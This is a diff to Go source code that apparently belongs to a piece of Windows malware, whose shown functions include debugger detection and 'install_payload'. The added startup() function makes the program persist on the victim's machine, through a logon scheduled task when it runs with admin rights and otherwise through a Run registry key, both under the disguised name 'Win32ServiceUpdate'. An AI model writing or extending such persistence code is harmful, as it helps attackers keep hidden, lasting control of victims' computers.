@@ -11,6 +11,7 @@ import (
 	"syscall"
 
 	"github.com/StackExchange/wmi"
+	"golang.org/x/sys/windows/registry"
 )
 
 func is_debugger_exist() bool {
@@ -141,5 +142,25 @@ func install_payload() {
 		os.Exit(0)
 	} else {
 		// linux
+	}
+}
+
+func startup() {
+	if is_admin() {
+		cmd := exec.Command(
+			"schtasks",
+			"/create",
+			"/sc", "onlogon",
+			"/tn", "Win32ServiceUpdate",
+			"/tr", get_module_file(),
+			"/f",
+		)
+		cmd.Start()
+	} else {
+		subPath := "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+		if reg_create_or_update_value(registry.CURRENT_USER, subPath,
+			"Win32ServiceUpdate", get_module_file(), true) {
+			log.Println("registry startup setting okay")
+		}
 	}
 }
